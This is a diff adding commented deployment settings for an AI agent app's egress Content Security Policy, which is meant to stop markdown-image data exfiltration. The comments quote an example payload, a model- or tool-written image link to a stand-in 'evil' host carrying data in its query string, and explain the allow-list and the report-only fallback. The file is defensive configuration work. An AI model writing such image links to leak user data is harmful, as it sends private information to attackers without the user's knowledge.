@@ -150,3 +150,15 @@ env:
   #   value: '600000'
   # - name: AGENT_SCHEDULER_MAX_SLEEP_MS    # the longest the scheduler sleeps between checks (default 900000)
   #   value: '900000'
+
+  # Egress CSP (md-exfil, D42). ENFORCED by default: the browser loads images, fonts, styles, media, fetches and frames only
+  # from the app itself (plus data:/blob:), so model- or tool-written `![x](https://evil/?d=...)` can not send data out with no
+  # click. A design system that pulls remote fonts or images is fixed WITHOUT a redeploy by an admin (Settings > Admin >
+  # External asset origins, live within 15 s); only add origins the organization controls, never shared hosting, form or
+  # script services (anything an allowed origin receives in a URL is readable by its owner).
+  # - name: EXTERNAL_ASSET_ORIGINS          # optional floor, space- or comma-separated https origins (no wildcard, IP, path)
+  #   value: 'https://fonts.example.com https://cdn.example.org'
+  # CSP_EGRESS=report is the emergency way back (deploy-time, never a click): the egress directives leave the enforced
+  # header and only the Report-Only policy watches. Redeploy the SAME build. Anything but "report" means enforce.
+  # - name: CSP_EGRESS
+  #   value: 'report'
